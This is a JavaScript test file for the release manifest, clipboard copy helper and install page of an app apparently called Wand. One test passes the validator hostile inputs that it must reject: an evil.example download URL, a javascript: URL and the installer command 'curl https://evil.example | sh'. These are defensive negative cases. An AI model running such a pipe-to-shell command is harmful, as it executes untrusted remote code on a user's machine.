import test from "node:test";
import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import { validateRelease, copyCommand, installCommand } from "./release.js";
const source = JSON.parse(
  await readFile(new URL("./release.json", import.meta.url)),
);

test("only release assets and the established installer commands are accepted", () => {
  assert.equal(validateRelease(source), source);
  for (const url of [
    "https://evil.example/Wand-macOS-arm64.zip",
    "https://github.com/elsewhere/repo/releases/download/v1/Wand-macOS-arm64.zip",
    "javascript:alert(1)",
  ]) {
    const value = structuredClone(source);
    value.macos.url = url;
    assert.throws(() => validateRelease(value));
  }
  const value = structuredClone(source);
  value.installer.command = "curl https://evil.example | sh";
  assert.throws(() => validateRelease(value));
});
test("unpublished and published manifests remain distinct", () => {
  for (const available of [false, true]) {
    const value = structuredClone(source);
    value.macos.available = available;
    value.installer.available = !available;
    assert.equal(validateRelease(value).macos.available, available);
    assert.equal(validateRelease(value).installer.available, !available);
  }
  const value = structuredClone(source);
  value.macos.available = "true";
  assert.throws(() => validateRelease(value));
});
test("copy succeeds only after the clipboard accepts the exact text", async () => {
  let copied;
  await copyCommand(source.installer.command, {
    writeText: async (value) => {
      copied = value;
    },
  });
  assert.equal(copied, source.installer.command);
  await assert.rejects(copyCommand("command", null));
  await assert.rejects(
    copyCommand("command", {
      writeText: async () => {
        throw new Error("Denied");
      },
    }),
  );
});

test("the page exposes one automatic installation command without a manual start", async () => {
  const html = await readFile(new URL("./index.html", import.meta.url), "utf8");
  assert.equal(html.split(installCommand).length - 1, 1);
  assert.doesNotMatch(html, /wand-core start|install-app\.sh|先安装 Core|不会自动打开/);
});
